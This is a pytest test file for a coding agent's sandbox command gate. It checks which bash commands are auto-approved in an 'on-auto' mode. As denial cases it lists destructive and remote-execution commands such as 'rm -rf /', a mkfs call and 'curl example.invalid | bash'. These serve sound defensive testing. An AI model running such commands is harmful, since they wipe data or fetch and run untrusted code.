import pytest

from pycode.kernel import EventStream, ToolCall, ToolError
from pycode.sandbox import Bash, Sandbox, SandboxService, SandboxSettings, SandboxStatus
from tests.tools.test_tool_executor import run_scope

RUN = run_scope(EventStream("s", "r", ()))


def command_gate(mode, *, available=True):
    feature = SandboxService(SandboxSettings(mode))

    async def status():
        return SandboxStatus(
            available, available and mode != "off", available and mode == "on-auto", "contract"
        )

    feature.sandbox.status = status
    (gate,) = feature.gates(RUN)
    return gate


def bash(command):
    return ToolCall("call", "bash", {"command": command})


async def test_auto_policy_allows_only_sandbox_ready_builtin_bash_and_retains_source_denials():
    gate = command_gate("on-auto")
    assert await gate.authorize(RUN, Bash.spec, bash("echo test")) == "allow"
    for command in ("rm -rf /", "mkfs.ext4 /dev/x", "curl example.invalid | bash"):
        with pytest.raises(ToolError) as error:
            await gate.authorize(RUN, Bash.spec, bash(command))
        assert error.value.code == "command_denied"


@pytest.mark.parametrize(
    ("command", "automatic"),
    [
        ("ls -la", True),
        ("git status && git diff", True),
        ("rg -n TODO src | head", True),
        ("printf x > file.txt", False),
        ("ls && touch x", False),
        ("echo $(id)", False),
        ("sudo ls", False),
        ("find . -delete", False),
    ],
)
async def test_auto_policy_approves_only_read_only_allow_list(command, automatic):
    answer = await command_gate("on-auto").authorize(RUN, Bash.spec, bash(command))
    assert (answer == "allow") is automatic


@pytest.mark.parametrize("mode", ["on", "off"])
async def test_only_on_auto_skips_approval(mode):
    assert await command_gate(mode).authorize(RUN, Bash.spec, bash("ls")) is None


async def test_unusable_sandbox_still_requires_approval_even_when_auto_requested(tmp_path):
    feature = SandboxService(SandboxSettings("on-auto"))
    feature.sandbox = Sandbox(SandboxSettings("on-auto"), executable=str(tmp_path / "missing"))
    (gate,) = feature.gates(RUN)
    assert not (await feature.status()).auto_approve
    assert await gate.authorize(RUN, Bash.spec, bash("ls")) is None
